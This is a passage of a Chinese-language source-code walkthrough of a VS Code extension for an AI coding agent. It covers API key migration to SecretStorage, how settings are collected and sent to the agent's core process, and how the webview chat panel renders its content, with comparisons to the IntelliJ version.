29      await context.secrets.store(API_KEY_SECRET, plain);
30      await clearPlaintextKey(config);
31      return { key: plain, migrated: true };
32    }
33    return { key: (process.env.OPENAI_API_KEY ?? "").trim(), migrated: false };
34  }
```

| 分支 | 条件 | 行为 | 返回 |
|---|---|---|---|
| A | SecretStorage 有值 | 顺手清掉设置里的明文 | `{key: stored, migrated: false}` |
| B | SecretStorage 空、设置里有明文 | 写入 SecretStorage 再清明文 | `{key: plain, migrated: true}` |
| C | 两者都空 | 读 `OPENAI_API_KEY` | `{key: env, migrated: false}` |

📌 **优先级：加密存储 > 设置明文 > 环境变量**。分支 A 特意把「设置里还留着一份明文」也清掉（20-27 行），否则用户改设置里的 `apiKey` 会以为生效了，实际被加密值覆盖——这是「不可阴影」原则。

⚠️ **环境变量只认 `OPENAI_API_KEY`**：用 Ollama 本地模型时不设 Key 也没关系；但如果用户用的是 `OPENAI_API_KEY` 之外的习惯名（例如 `DEEPSEEK_API_KEY`），必须手动填到设置里。

⚠️ **`apiKey` 是唯一会「写到磁盘以外」的设置**：其余 17 项都由 `collectSettings` 实时读取（§5），Key 则缓存在 `CoreSession.apiKey` 字段里（`session.ts:23`），只在 `keyReady` 完成时读一次。所以**运行中改 Key 不会生效**，必须重启 Core（或重启扩展）。

### 4.3 `clearPlaintextKey()`（39-47 行）：按层删除

```ts
39  async function clearPlaintextKey(config: vscode.WorkspaceConfiguration): Promise<void> {
40    const info = config.inspect<string>("apiKey");
41    const target = info?.workspaceFolderValue !== undefined
42      ? vscode.ConfigurationTarget.WorkspaceFolder
43      : info?.workspaceValue !== undefined
44        ? vscode.ConfigurationTarget.Workspace
45        : vscode.ConfigurationTarget.Global;
46    await config.update("apiKey", undefined, target);
47  }
```

VS Code 的配置有三层：Global（用户级 `settings.json`）、Workspace（`.vscode/settings.json`）、WorkspaceFolder（多根工作区里某一根）。`config.update(key, undefined, target)` **必须指定正确的层**，否则会「删了个寂寞」——值还在，只是被另一层遮住。

📌 `inspect()` 返回的对象里，`globalValue`、`workspaceValue`、`workspaceFolderValue` 各自对应一层。这里按「最具体」优先判断：先 WorkspaceFolder，再 Workspace，最后 Global。

⚠️ **只删一层**：如果用户同时在三层都写了 `apiKey`，迁移只会清掉最具体的那一层，其余两层仍是明文。因为迁移完成后 `stored` 非空，下次启动会走分支 A 再清一层——**需要启动三次才能清干净**。

🔁 对照 Java：IntelliJ 用 `PasswordSafe.instance.set/get`，没有「迁移」这一步，也没有分层配置的概念（`ReportSettingsState` 是单层 XML）。所以**这段迁移逻辑是 VS Code 独有的复杂度**。

---

## 5. `settings.ts`（70 行）：18 个设置项 → 14 个下发字段

### 5.1 `detectProvider()`（8-21 行）：端点形状优先

```ts
 8  function detectProvider(configured: string, baseUrl: string): string {
 9    const provider = (configured || "").trim().toLowerCase();
10    const base = (baseUrl || "").trim().toLowerCase().replace(/\/+$/, "");
11    if (!base) {
12      return provider || "ollama";
13    }
14    if (/\/api\/(chat|generate|embed|embeddings|tags)$/.test(base)) {
15      return "ollama";
16    }
17    if (base.includes("/chat/completions") || base.endsWith("/v1")) {
18      return "openai_compat";
19    }
20    return provider === "openai_compat" ? "openai_compat" : "ollama";
21  }
```

规则与 Core 的 `detect_provider()`（`llm/__init__.py:16-38`）**逐条对齐**：

| 条件 | 判定 | Core 侧对应 |
|---|---|---|
| 端点为空 | `configured` 原值，缺省 `ollama` | L27-28 `return configured or "ollama"` |
| 以 `/api/{chat,generate,embed,embeddings,tags}` 结尾 | `ollama` | L13 `_OLLAMA_SUFFIXES` |
| 含 `/chat/completions` 或以 `/v1` 结尾 | `openai_compat` | L31 |
| 其它 | 看类型列 | L34 |

📌 **为什么壳要自己算一遍**？因为 `settings/update` 只下发 `provider` + `base_url` 两个独立字段，Core 拿到后会用同样的规则**再算一次**（`build_provider` → `detect_provider`）。所以这里是**冗余但一致**的双保险：壳算是为了让「设置页显示的类型」与「实际协议」一致；Core 算是因为不能相信壳（MCP、CLI 都可能直接改配置）。

⚠️ **`replace(/\/+$/, "")` 只去尾部斜杠**：`http://host//v1//chat/completions` 这种双斜杠中间态不会被规范化。Core 侧同样只 `rstrip("/")`，所以两端**错得一致**。

### 5.2 `collectSettings()`（26-66 行）：字段全表

```ts
26  export function collectSettings(apiKey: string): Record<string, unknown> {
27    const config = vscode.workspace.getConfiguration("agentCoder");
28    const configured = config.get<string>("provider", "ollama");
29    const baseUrl = config.get<string>("baseUrl", "http://localhost:11434");
30    const settings: Record<string, unknown> = {
31      provider: detectProvider(configured, baseUrl),
32      base_url: baseUrl,
33      model: config.get<string>("model", "qwen2.5:7b"),
34      // Same field set as the IntelliJ pushSettings payload (§4.5).
35      // 与 IntelliJ pushSettings 下发同一套字段（§4.5）。
36      embedding_model: config.get<string>("embeddingModel", "") ?? "",
37      max_iterations: config.get<number>("maxIterations", 40),
38      context_window: config.get<number>("contextWindow", 32000),
39      temperature: config.get<number>("temperature", 0.2),
40      max_tokens: config.get<number>("maxTokens", 4096),
41      tool_concurrency: config.get<number>("toolConcurrency", 4),
42      subagent_concurrency: config.get<number>("subagentConcurrency", 3),
43      // Team switch: empty string means "no team", the 3.3.0 default.
44      // 团队开关：空串表示不启用，即 3.3.0 的默认值。
45      active_team: config.get<string>("activeTeam", "") ?? "",
46    };
47
48    if (apiKey) {
49      settings.api_key = apiKey;
50    }
51
52    const mcpServers = config.get<unknown[]>("mcpServers", []);
53    if (Array.isArray(mcpServers) && mcpServers.length > 0) {
54      settings.mcp_servers = mcpServers;
55    }
56
57    // Non-empty overrides the Core's built-in list; empty keeps the defaults.
58    // 非空列表覆盖 Core 内置白名单，空列表继续用默认值。
59    const allowlist = config.get<string[]>("commandAllowlist", []);
60    if (Array.isArray(allowlist)) {
61      settings.command_allowlist = allowlist
62        .map((entry) => String(entry).trim())
63        .filter((entry) => entry.length > 0);
64    }
65    return settings;
66  }
```

**下发字段（14 键，其中 3 个条件性）**：

| 字段 | 类型 | 来源设置项 | 默认 | 条件 |
|---|---|---|---|---|
| `provider` | string | `provider` + `baseUrl` | `ollama` | 必发（被 `detectProvider` 改写） |
| `base_url` | string | `baseUrl` | `http://localhost:11434` | 必发 |
| `model` | string | `model` | `qwen2.5:7b` | 必发 |
| `embedding_model` | string | `embeddingModel` | `""` | 必发 |
| `max_iterations` | number | `maxIterations` | 40 | 必发 |
| `context_window` | number | `contextWindow` | 32000 | 必发 |
| `temperature` | number | `temperature` | 0.2 | 必发 |
| `max_tokens` | number | `maxTokens` | 4096 | 必发 |
| `tool_concurrency` | number | `toolConcurrency` | 4 | 必发 |
| `subagent_concurrency` | number | `subagentConcurrency` | 3 | 必发 |
| `active_team` | string | `activeTeam` | `""`（不启用） | 必发 |
| `api_key` | string | 参数 `apiKey` | — | 非空才发 |
| `mcp_servers` | array | `mcpServers` | `[]` | 非空才发 |
| `command_allowlist` | string[] | `commandAllowlist` | `[]` | 数组就发（可能为空） |

📌 **`command_allowlist` 与 `mcp_servers` 的条件不同**，这是有意的：

- `mcp_servers` 为空 → **不发**。Core 的 `_apply_settings` 是合并语义（`server.py:457-466`），不发就保留 Core 里已有值；而 MCP 的最终列表由 `merge_configs(project, settings)` 算出，项目级 `.agent/mcp.json` **按名字覆盖** settings 下发的同名项（`mcp/config.py:82-87`），所以两份来源本来就互不吹销，但「不发」能少一次无意义的配置变更。
- `command_allowlist` 为空 → **发空数组**。Core 侧把空数组解释为「用内置白名单」（`permissions.py`，06 卷 §4），所以必须显式发“空”才能表达「用户没自定义」。

⚠️ **`embedding_model` 默认发 `""`，会覆盖 Core 的 `nomic-embed-text` 默认值**。Core 的 `ChatConfig.embedding_model` 默认是 `nomic-embed-text`（`protocol.py:79`），但 VS Code 无条件下发 `""`，于是配置被改成空串；随后 `Embedder.embed()` 第一行检查就是：

```
57    if not self.model:
58        raise RpcError(ErrorCode.PROTOCOL_ERROR, "未配置 Embedding 模型")
```

（`codeindex/embeddings.py:57-58`）

结果是 **VS Code 侧开箱即用的语义索引是坏的**，用户必须手填 `nomic-embed-text`。而 IntelliJ 侧的 `ReportSettingsState.embeddingModel` 默认就是 `nomic-embed-text`（`ReportSettingsState.java:59`），设置页留空时还会**规范化回填**（`ReportSettingsConfigurable.java:257-258`）。

🔁 这是一处**真实的功能差异**，也是 `vscode/scripts/check-settings.js` 这类「字段集合比对」脚本**抓不到**的问题——它只比 key 的集合，不比默认值语义。修法有两种：VS Code 侧把默认值改成 `nomic-embed-text`，或 `collectSettings` 在空值时**不下发**该字段（推荐后者，与 `mcp_servers` 同策略）。

### 5.3 `autoAcceptEdits()`（68-70 行）

```ts
68  export function autoAcceptEdits(): boolean {
69    return vscode.workspace.getConfiguration("agentCoder").get<boolean>("autoAcceptEdits", false);
70  }
```

被 `diff.ts:22` 使用：为 `true` 时跳过 diff 预览直接写入。它**不下发给 Core**——因为「要不要弹 diff」纯属壳层 UI 决策，Core 只负责判断「这个工具需要确认」。

📌 **这是「壳拥有的策略」与「Core 拥有的策略」的分界线**：

| 决策 | 归属 | 理由 |
|---|---|---|
| 这个工具要不要确认 | Core（`permissions.py`） | 安全策略必须统一，否则换个壳就能绕过 |
| 确认弹窗长什么样 | 壳 | IntelliJ 用 `DiffConfirmCard`，VS Code 用原生 diff 编辑器 |
| 用户选了「以后都自动接受」 | 壳 | 这是编辑器偏好，不是 Agent 策略 |

### 5.4 `vscode/package.json` 里的 18 个设置项（对照）

`collectSettings` 只读其中 13 项；另外 5 项不进 RPC：

| 设置项 | 行 | 为什么不进 RPC |
|---|---:|---|
| `pythonPath` | 54-58 | 壳层进程管理（§3.2） |
| `coreHome` | 59-63 | 壳层进程管理（§3.3） |
| `apiKey` | 80-84 | 已经迁移进 SecretStorage（§4.2），以参数形式传入 |
| `autoAcceptEdits` | 120-124 | 壳层 UI 决策（§5.3） |
| `inlineCompletion.enabled` | 133-137 | 壳层 UI 决策（`inline.ts:30`） |

⚠️ `inlineCompletion.enabled` 是设置项里**唯一带点号的两段式 key**，所以 `config.get<boolean>("inlineCompletion.enabled", true)` 要用完整路径（`inline.ts:30`），而 `affectsConfiguration("agentCoder")` 依然能命中它。

---

## 6. `panel.ts`（774 行）：一个文件顶掉整个 Java 渲染层

Java 侧用了 **51 个文件 / 12,400 行** 做 UI（08 卷），VS Code 侧只用了 `panel.ts` 一个文件 774 行：**253-311 行是 CSS，314-335 行是 HTML 骨架，336-774 行是内联脚本**，真正属于 TypeScript 的只有 1-243 行（下行方法）加上 `render()`（244-774）里那条巨大的模板字符串。

这个对比本身就是本卷最重要的一个结论：**渲染复杂度不会消失，只会搬到另一个运行时**。

### 6.1 十一个类型别名与五个数据结构（6-64 行）

```ts
 6  type MessageHandler = (text: string) => void;
 7  type StopHandler = () => void;
 8  type ConfirmHandler = (id: string, approved: boolean) => void;
 9  type HistoryHandler = () => void;
10  type HistoryOpenHandler = (id: string) => void;
11  type HistoryDeleteHandler = (id: string) => void;
12  type HistorySearchHandler = (query: string) => void;
13  type MemoryResolveHandler = (id: string, approve: boolean, content?: string) => void;
14  type TeamListHandler = () => void;
15  type TeamSelectHandler = (name: string) => void;
16  type ArtifactHandler = () => void;
17
18  // One row of the Core-owned checklist (chat/todos).
19  // Core 维护的任务清单的一行（chat/todos）。
20  export interface TodoItem {
21    content: string;
22    status: string;
23  }
24
25  // One stored conversation as returned by ``session/list``.
26  // 历史列表的一条（来自 session/list）。
27  export interface HistoryEntry {
28    id: string;
29    title: string;
30    preview: string;
31    messageCount: number;
32    updatedAt: number;
33    // Search hits carry a <mark>-wrapped snippet instead of a message count.
34    // 搜索命中带一段 <mark> 包住的正文片段，而不是消息条数。
35    snippet?: string;
36  }
37
38  // One review candidate from .agent/memories/_pending (memory/pending).
39  // 待确认的记忆候选（memory/pending）。
40  export interface PendingMemory {
41    id: string;
42    title: string;
43    content: string;
44    category: string;
45    source: string;
46  }
47
48  // One roster entry from ``team/list``.
49  // 团队名册的一项（team/list）。
50  export interface TeamEntry {
51    name: string;
52    description: string;
53    members: number;
54    active: boolean;
55  }
56
57  // One blackboard item from ``team/artifacts``.
58  // 团队黑板的一条（team/artifacts）。
59  export interface ArtifactEntry {
60    kind: string;
61    title: string;
62    authorRole: string;
63    body: string;
64  }
```

📌 **`HistoryEntry` 一个类型兼两用**：`session/list` 返回 `{id,title,preview,messageCount,updatedAt}`，`session/search` 返回 `{sessionId,title,snippet,updatedAt}`。两者在 `session.ts` 里被归一成同一个 `HistoryEntry`（`session.ts:576-615`），`snippet` 作为可选字段只在搜索时出现。

⚠️ **`TodoItem.status` / `PendingMemory.category` 都是裸 `string`**：Core 侧其实是固定枚举（`pending`/`in_progress`/`completed`/`cancelled`；`user_preference`/`correction`）。TS 不用联合类型是**故意的宽容**：Core 加一个新状态不应该让扩展编译失败。代价是拿不到穷举检查——`TODO_MARKS[item.status] || "☐"`（`panel.ts:394`）就是这种宽容的显式兑价。

### 6.2 字段与 `setHandlers()`（66-115 行）

```ts
66  export class ChatPanel implements vscode.WebviewViewProvider {
67    static readonly viewId = "agentCoder.chatView";
68
69    private view?: vscode.WebviewView;
70    private readonly pending: Array<Record<string, unknown>> = [];
71    private onSend?: MessageHandler;
72    private onStop?: StopHandler;
73    private onConfirm?: ConfirmHandler;
74    private onHistoryList?: HistoryHandler;
75    private onHistoryOpen?: HistoryOpenHandler;
76    private onHistoryDelete?: HistoryDeleteHandler;
77    private onHistorySearch?: HistorySearchHandler;
78    private onMemoryList?: HistoryHandler;
79    private onMemoryResolve?: MemoryResolveHandler;
80    private onNewSession?: HistoryHandler;
81    private onTeamList?: TeamListHandler;
82    private onTeamSelect?: TeamSelectHandler;
83    private onArtifacts?: ArtifactHandler;
84
85    constructor(private readonly extensionUri: vscode.Uri) {}
```

十三个回调，全部可选（`?`），全部在 `setHandlers`（87-115 行）里逐字段赋值——**没有中间注册表、没有事件总线**。

🔁 对照 Java：`AgentChatPanel` / `ChatSessionPanel` 用构造器把 `Listener`（匿名类）传下去，效果一样；但 Java 的监听器是**接口**，VS Code 这边是**13 个回调字段（`71-83`）/ 11 个函数类型**（`HistoryHandler` 被历史列表、记忆列表、新会话三处复用）。函数类型的优势是 JS 的闭包捕获——`session.ts:36-50` 直接写 `onSend: (text) => void this.send(text)`，不需要内部类。

📌 **`pending` 数组（70 行）与 `RpcConnection.pending`（`rpc.ts:32`）同名但无关**：前者是「Webview 还没建好，先攒着的下行消息」，后者是「等 Core 回包的请求表」。

### 6.3 `resolveWebviewView()`（117-158 行）：视图首次出现的三件事

```ts
117   resolveWebviewView(view: vscode.WebviewView): void {
118     this.view = view;
119     view.webview.options = {
120       enableScripts: true,
121       localResourceRoots: [this.extensionUri],
122     };
123     view.webview.html = this.render();
124     for (const message of this.pending.splice(0)) {
125       void view.webview.postMessage(message);
126     }
127     view.webview.onDidReceiveMessage((message: Record<string, unknown>) => {
128       const type = String(message.type ?? "");
129       if (type === "send") {
130         this.onSend?.(String(message.text ?? ""));
131       } else if (type === "stop") {
132         this.onStop?.();
133       } else if (type === "confirm") {
134         this.onConfirm?.(String(message.id ?? ""), Boolean(message.approved));
135       } else if (type === "historyList") {
136         this.onHistoryList?.();
137       } else if (type === "historyOpen") {
138         this.onHistoryOpen?.(String(message.id ?? ""));
139       } else if (type === "historyDelete") {
140         this.onHistoryDelete?.(String(message.id ?? ""));
141       } else if (type === "historySearch") {
142         this.onHistorySearch?.(String(message.query ?? ""));
143       } else if (type === "memoryList") {
144         this.onMemoryList?.();
145       } else if (type === "memoryResolve") {
146         const content = typeof message.content === "string" ? message.content : undefined;
147         this.onMemoryResolve?.(String(message.id ?? ""), Boolean(message.approve), content);
148       } else if (type === "newSession") {
149         this.onNewSession?.();
150       } else if (type === "teamList") {
151         this.onTeamList?.();
152       } else if (type === "teamSelect") {
153         this.onTeamSelect?.(String(message.name ?? ""));
154       } else if (type === "artifacts") {
155         this.onArtifacts?.();
156       }
157     });
158   }
```

| 步 | 行 | 作用 |
|---|---:|---|
| 1 | 118 | 记下 view，后续 `post` 才有目标 |
| 2 | 119-122 | 开脚本 + 限定资源根 |
| 3 | 123 | 塞入整页 HTML（调用 `render()`） |
| 4 | 124-126 | **补发积压消息**：`splice(0)` 清空数组并逐条发 |
| 5 | 127-157 | 注册「Webview → 扩展」的入口，13 种 `type` 分派 |

📌 **`splice(0)` 而不是 `for...of` 后 `length = 0`**：`splice(0)` 返回被删掉的元素并清空原数组，一次操作完成「取出 + 清空」。

⚠️ **第 124-126 行补发时 Webview 尚未执行脚本**：`view.webview.html = ...` 是异步生效的，`postMessage` 在页面加载完成前发出会**丢失**。VS Code 官方建议在 Webview 脚本里先发一个 `ready` 消息再回放（“Webview 首次加载”模式）。当前实现依赖 `retainContextWhenHidden: true` + 实际时序（`resolveWebviewView` 到用户开始操作之间通常已加载完），属于**隐式时序依赖**。

⚠️ **`localResourceRoots: [this.extensionUri]` 是空设**：整页没有引用任何外部资源（CSS 内联、无图片、无字体），因为 `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; ...">`（251-252 行）把 `default-src` 设成 `none`，任何外部资源本来就会被拦。

### 6.4 `post()`（160-168 行）：下行总线

```ts
160   private post(message: Record<string, unknown>): void {
161     if (this.view) {
162       void this.view.webview.postMessage(message);
163     } else {
164       // The view may not be resolved yet; replay once it appears.
165       // 视图尚未解析时先缓存，解析后补发。
166       this.pending.push(message);
167     }
168   }
```

所有下行方法（170-242 行）都是这个函数的一行包装：

| 方法 | 行 | 消息体 | 前端处理 |
|---|---:|---|---|
| `appendUser` | 170-172 | `{type:"append", role:"user", text}` | 加「你：」气泡 + 预建「助手：」气泡 |
| `appendToken` | 174-176 | `{type:"delta", text}` | 追加到当前助手气泡 |
| `finishMessage` | 178-180 | `{type:"end"}` | 清空 `current` |
| `appendSystem` | 182-184 | `{type:"append", role:"system", text}` | 斜体系统行 |
| `setBusy` | 186-188 | `{type:"busy", value}` | 切换发送/停止按钮，同时禁用团队下拉 |
| `setStatus` | 190-192 | `{type:"status", text}` | 顶部状态行 |
| `setTodos` | 196-198 | `{type:"todos", todos}` | 重绘清单 |
| `reset` | 202-204 | `{type:"reset"}` | 清屏 + 清清单 + 收起历史/记忆 |
| `appendHistory` | 208-210 | `{type:"append", role, text}` | 复用 `append` |
| `showHistory` | 212-214 | `{type:"history", entries}` | 历史列表 |
| `showHistorySearch` | 218-220 | `{type:"historySearch", entries, query}` | 列表（`query` 被忽略） |
| `showMemories` | 224-226 | `{type:"memory", items}` | 记忆候选 |
| `showConfirm` | 228-230 | `{type:"confirm", id, title, detail}` | 内联确认卡 |
| `setTeams` | 234-236 | `{type:"teams", teams, active}` | 重绘工具栏下拉 |
| `showArtifacts` | 240-242 | `{type:"artifacts", items}` | 重绘交付物抽屉 |

⚠️ **`pending` 无上限、无去重**：`chat/token` 是按 token 发的（`session.ts:425-427` → `panel.ts:174-176`），若面板一直不可见，每个 token 都会被存下来。实测一个 2,000 token 的回复就是 2,000 个对象。因为 `retainContextWhenHidden: true`，实际只在**首次加载前**会积压（激活时 `ensureStarted` 会先 `setStatus`，属于 1 条）。

📌 **`showConfirm` 的 `title` 在 3.3.0 才真正被渲染**：`case "confirm"` 先看 `message.title`（`panel.ts:738-743`），有就加一行 `.ctitle`。这正是「团队预审卡」与「MCP 确认卡」的唯一区分点——两者在 Core 侧共用 `agent/confirm`，仅靠 `kind` 分流到不同标题（`session.ts:506-515`）。

### 6.5 `render()`（244-252 行）：先看 CSP 与状态栏

```ts
244    private render(): string {
245      const nonce = Array.from({ length: 16 }, () =>
246        "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]).join("");
247      return `<!DOCTYPE html>
248  <html lang="zh">
249  <head>
250  <meta charset="UTF-8" />
251  <meta http-equiv="Content-Security-Policy"
252        content="default-src 'none'; style-src 'unsafe-inline'; script-src 'nonce-${nonce}';" />
```

- **nonce 用 `Math.random()`**：不是密码学随机，但 CSP 只要求「不可预测」，且脚本全部内联、无外部加载，实际风险极低。
- **`style-src 'unsafe-inline'`**：CSS 全写在 `<style>` 里（253-311 行），没有 `'unsafe-inline'` 就全被拦。
- **`script-src 'nonce-...'`**：页面只有一处 `<script nonce="${nonce}">`（336 行），不匹配的脚本一律不执行。

页面骨架（314-335 行）：

```
314  <body>
315    <div id="status">正在启动 Agent Core...</div>
316    <div id="bar">
317      <button id="historyBtn">历史</button>
318      <button id="memoryBtn">记忆</button>
319      <button id="artifactsBtn">交付物</button>
320      <button id="newBtn">新会话</button>
321    </div>
322    <div id="teamRow"><span>团队</span><select id="team">...</select></div>
323    <div id="artifacts" hidden></div>
324    <div id="history" hidden>
325      <input id="historySearch" placeholder="搜索历史会话：标题与正文" />
326      <div id="historyList"></div>
327    </div>
328    <div id="memory" hidden></div>
329    <div id="todos" hidden></div>
330    <div id="log"></div>
331    <textarea id="input" placeholder="描述你的任务，例如：帮我解释当前文件的登录流程"></textarea>
332    <div id="row">
333      <button id="send">发送</button>
334      <button id="stop" disabled>停止</button>
335    </div>
```

📌 **布局全靠 CSS flex**（254-256 行 `body { display:flex; flex-direction:column; height:100vh }` + 263 行 `#log { flex:1; overflow-y:auto }`）。`#log` 是唯一的伸缩区，其余都是固定高度或内容高度。这与 Java 侧 `BlockListLayout` + `ChatView.ScrollHolder` 手写布局目标完全等价，但实现成本差了两个数量级。

📌 **初始状态已写死一句「正在启动 Agent Core...」**（315 行）。它不是由 `post` 驱动的——所以即使扩展还没激活完，用户也能看到一句有意义的话。

### 6.6 CSS 里藏着的几个决定（253-311 行）

| 行 | 规则 | 含义 |
|---|---|---|
| 258-259 | `#todos { max-height:25vh; overflow-y:auto }` | 清单最多占四分之一屏 |
| 265-266 | `#history { max-height:40vh }` | 历史最多 40% |
| 270-271 | `#memory { max-height:45vh }` | 记忆最多 45% |
| 278 | `mark { background:transparent; font-weight:bold; color:inherit }` | 搜索命中**只加粗不涂黄**，避免与主题冲突 |
| 286-287 | `.user` 用 `--vscode-textLink-foreground`、`.system` 斜体灰 | 角色靠颜色区分，不靠头像 |
| 293-295 | `#input { height:48px; resize:vertical }` | 输入框可拖高，但初始只有 48px |
| 302-303 | `#artifacts { max-height:40vh; overflow-y:auto }` | 交付物抽屉有高度上限 |
| 311 | `button:disabled { opacity:.5 }` | 忙碌时发送与团队下拉均不可用 |

📌 **全站颜色都来自 `--vscode-*` 变量**（`--vscode-foreground`、`--vscode-sideBar-background`、`--vscode-button-background`……），所以**换主题、换高对比度模式不需要一行代码**。这正是 Java 侧 `UiTheme`（08 卷 §11.2）手写 10 个 `JBColor` 才达到的效果。

### 6.7 前端状态（354-371 行）

```js
336  <script nonce="${nonce}">
337    const vscode = acquireVsCodeApi();
338    const log = document.getElementById("log");
...
354    let current = null;
355    let todoItems = [];
356    let todosCollapsed = false;
357    let historyEntries = [];
358    let historySearchTimer = null;
359    let memoryItems = [];
360    let artifactItems = [];
361
362    const TODO_MARKS = {
363      pending: "☐",
364      in_progress: "◐",
365      completed: "☑",
366      cancelled: "☒",
367    };
368
369    function todoDone(item) {
370      return item.status === "completed" || item.status === "cancelled";
371    }
```

七个变量就是整个前端的状态：

| 变量 | 作用 | 生命周期 |
|---|---|---|
| `current` | 正在流式输出的助手气泡元素 | `delta` 累积期间非空 |
| `todoItems` | 当前清单的原始数据 | 最近一次 `todos` 消息 |
| `todosCollapsed` | 清单是否折叠 | 用户点击或新清单 |
| `historyEntries` | 历史列表缓存 | 用于「清空搜索框时本地恢复」 |
| `historySearchTimer` | 300 ms 防抖定时器句柄 | 每次输入重建 |
| `memoryItems` | 记忆候选缓存 | 用于编辑取消时重绘 |
| `artifactItems` | 交付物缓存 | 用于抽屉展开/折叠 |

📌 **`acquireVsCodeApi()` 只能调一次**（VS Code 硬性限制），所以第 337 行把它放在最顶部、只调一次。

⚠️ **没有 `vscode.setState()`**：Webview 被隐藏/重建时状态会丢。这里靠 `retainContextWhenHidden: true`（`extension.ts:18`）硬保住了 DOM。若哪天去掉这个选项，清单、历史、当前气泡全部丢失——**这是一个隐形的强依赖**。

### 6.8 `renderTodos()`（373-397 行）：整表重绘

```js
373    function renderTodos() {
374      todoBox.textContent = "";
375      if (!todoItems.length) {
376        todoBox.hidden = true;
377        return;
378      }
379      todoBox.hidden = false;
380      const done = todoItems.filter(todoDone).length;
381      const head = document.createElement("div");
382      head.className = "todo-head";
383      head.textContent = (todosCollapsed ? "▸ " : "▾ ") + "任务清单 " + done + "/" + todoItems.length
384        + (todosCollapsed && done === todoItems.length ? "（已完成）" : "");
385      head.addEventListener("click", () => {
386        todosCollapsed = !todosCollapsed;
387        renderTodos();
388      });
389      todoBox.appendChild(head);
390      if (todosCollapsed) return;
391      for (const item of todoItems) {
392        const row = document.createElement("div");
393        row.className = "todo-row" + (item.status === "in_progress" ? " active" : "");
394        row.textContent = (TODO_MARKS[item.status] || "☐") + " " + item.content;
395        todoBox.appendChild(row);
396      }
397    }
```

**与 Java `TodoStrip` 逐项对照**：

| 方面 | Java（`TodoStrip.java`） | VS Code（`panel.ts`） |
|---|---|---|
| 空清单 | `setVisible(false)`（L70-73） | `todoBox.hidden = true`（L376） |
| 折叠判定 | `collapsed = doneCount >= items.size()`（L77） | `todosCollapsed = every(todoDone)`（L722） |
| 头部文本 | `AgentBundle.message("todos.header", "", done, total, suffix)`（L155） | 字符串拼接（L383-384） |
| 折叠箭头 | **自绘折角**（L142-147，注释明说「用自绘折角替换 ▸/▾，各平台字形不一致」） | **直接用 `▸` / `▾` 字符**（L383） |
| 行状态标记 | 自绘圆环 / 3/4 圆弧 / 勾 / 叉（L198-222） | `☐ ◐ ☑ ☒` 字符（L362-367） |
| 完成删除线 | `drawLine` 手绘（L189-195） | 无 |
| 进行中强调 | 3/4 圆弧 + 强调色 | `.active { font-weight:bold }`（L262） |
| 行文本溢出 | `ellipsize()` 逐字回退加 `…`（L224-239） | CSS 不管，靠容器滚动 |

📌 **最有意思的一处差异**：Java 特意**不用字形**（”各平台字形不一致“），VS Code 却全用字形。因为 Webview 的渲染引擎（Chromium）自带回退字体链，`☐` 这类符号几乎总有字形；而 Swing 的 `Font` 回退在不同 JDK/系统上表现不一。同一个决定在两种运行时下**结论相反**。

⚠️ **手动展开会被下一次通知冲掉**：`case "todos"` 每次都重算 `todosCollapsed = todoItems.length > 0 && todoItems.every(todoDone)`（L722）。用户刚展开一个已完成的清单，只要 Core 再发一次 `chat/todos`（哪怕内容一样），就会又收起来。Java 侧同样（`setItems` L77 无条件重置），这是个**双端一致的行为缺陷**。

### 6.9 `block()` / `timeText()`（399-411 行）

```js
399    function block(role, text) {
400      const div = document.createElement("div");
401      div.className = role;
402      div.textContent = text;
403      log.appendChild(div);
404      log.scrollTop = log.scrollHeight;
405      return div;
406    }
407
408    function timeText(ms) {
409      if (!ms) return "";
410      return new Date(ms).toLocaleString();
411    }
```

📌 **`textContent` 而非 `innerHTML`**：这是整个前端的安全基石。Core 的输出、工具返回的文件内容、用户输入全部原样进 `textContent`，没有任何 HTML 注入面。

⚠️ **只有「纯文本」没有 Markdown**：Java 侧有 389 行的 `MarkdownRenderer` + 360 行的 `MarkdownParser` + 15 个 `*View`（08 卷 §6–§10），因为 Swing 没有现成的 Markdown 控件。Webview 本来可以直接用 `marked` + `highlight.js` 拿到同等能力，但当前实现**一行都没用**——代码块、表格、列表全部以纯文本挤出。这是整个 VS Code 壳最大的功能缺口。

### 6.10 `snippetNode()`（413-430 行）：唯一的 HTML 片段解析器

```js
413    // session/search wraps hits in <mark>; build real nodes instead of innerHTML.
414    // session/search 用 <mark> 包住命中片段，这里用 DOM 节点拼，不拼 innerHTML。
415    function snippetNode(text) {
416      const div = document.createElement("div");
417      div.className = "hmeta";
418      let mark = null;
419      for (const part of String(text || "").split(/(<mark>|<\/mark>)/)) {
420        if (part === "<mark>") {
421          mark = document.createElement("mark");
422          div.appendChild(mark);
423        } else if (part === "</mark>") {
424          mark = null;
425        } else if (part) {
426          (mark || div).appendChild(document.createTextNode(part));
427        }
428      }
429      return div;
430    }
```

四步：按 `<mark>` / `</mark>` 切分 → 遇到开始标签就新建一个 `<mark>` 并挂到 div 上 → 遇到结束标签就把 `mark` 指针置空 → 其余文本挂到当前容器。

📌 **这是「只支持一个标签」的微型解析器**：Core 的 `session/search` 只会在命中词两侧加 `<mark>`（`agent/search.py`），不会带其它标签。所以不需要通用 HTML 解析器。

📌 **安全性不靠转义，靠构造**：即使命中片段里本来就有 `<script>`，它也会被 `createTextNode` 包成文本节点，**永远不会被当成标签执行**。这比「先转义再拼 innerHTML」更难写错。

### 6.11 `renderHistory()`（434-476 行）

```js
434    function renderHistory(entries) {
435      historyEntries = Array.isArray(entries) ? entries : [];
436      historyList.textContent = "";
437      if (!historyEntries.length) {
438        const empty = document.createElement("div");
439        empty.className = "system";
440        empty.textContent = historySearch.value.trim() ? "没有匹配的会话，换个关键词试试。" : "还没有历史会话";
441        historyList.appendChild(empty);
442      } else {
443        for (const entry of historyEntries) {
444          const row = document.createElement("div");
445          row.className = "hrow";
446          row.title = entry.preview || entry.title || "";
447          const main = document.createElement("div");
448          main.className = "hmain";
449          const title = document.createElement("div");
450          title.className = "htitle";
451          title.textContent = entry.title || "未命名会话";
452          main.appendChild(title);
453          if (entry.snippet) {
454            main.appendChild(snippetNode(entry.snippet));
455          } else {
456            const meta = document.createElement("div");
457            meta.className = "hmeta";
458            meta.textContent = timeText(entry.updatedAt) + " · " + (entry.messageCount || 0) + " 条消息";
459            main.appendChild(meta);
460          }
461          const remove = document.createElement("button");
462          remove.className = "hdel";
463          remove.textContent = "×";
464          remove.title = "删除这条历史记录";
465          remove.addEventListener("click", (event) => {
466            event.stopPropagation();
467            vscode.postMessage({ type: "historyDelete", id: entry.id });
468          });
